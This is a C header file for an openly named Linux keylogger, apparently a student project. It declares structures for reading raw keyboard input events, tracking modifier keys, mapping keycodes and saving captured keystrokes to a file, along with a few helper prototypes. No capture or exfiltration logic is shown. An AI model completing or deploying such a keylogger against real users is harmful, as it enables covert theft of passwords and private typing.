#ifndef KEYLOGGER_H
# define KEYLOGGER_H

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <linux/input.h>
#include <sys/stat.h>

# define KEYBOARD_CST 0
# define TRUE 1
# define FALSE 0
# define SUCCESS 0
# define ERROR 1
# define INTERUPT 2

typedef struct	s_mod
{
	int	shift;
	int	alt;
	int	ctrl;
	int	numlock;
	int	capslock;
}				t_mod;
typedef struct	s_keylogger
{
	char				*kbdfile;
    struct input_event	event;
	char				*keymap[257][8];
	int					saveFD;
	int					keyboardFD;
	t_mod				mod;

}				t_keylogger;

void	clean_quit(t_keylogger *klg, int code);
int     lentochar(char *s, char c);
void    ft_putstr(char *s);
void    ft_putchar(char c);
void	ft_strncpy(char *dest, char *src, int n);


#include "keymap.h"

#endif // KEYLOGGER_H